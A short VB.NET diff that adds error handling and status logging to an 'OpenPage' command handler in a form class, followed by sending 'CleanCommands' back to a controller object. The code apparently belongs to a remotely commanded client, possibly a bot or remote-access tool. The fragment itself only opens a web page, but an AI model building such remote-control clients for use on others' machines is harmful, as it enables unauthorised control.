@@ -409,9 +409,14 @@ Public Class Form1
 
 
                     Case "OpenPage"
-                        Dim OpenPage As New Thread(Sub() BrowserHandler.OpenWebPage(A(1)))
-                        OpenPage.IsBackground = True
-                        OpenPage.Start()
+                        Try
+                            Dim OpenPage As New Thread(Sub() BrowserHandler.OpenWebPage(A(1)))
+                            OpenPage.IsBackground = True
+                            OpenPage.Start()
+                            C.Log("Succ", "Webpage has been opened in visable mode")
+                        Catch ex As Exception
+                            C.Log("Fail", "An unexpected error occurred" & ex.Message)
+                        End Try
                         C.Send("CleanCommands")
 
 
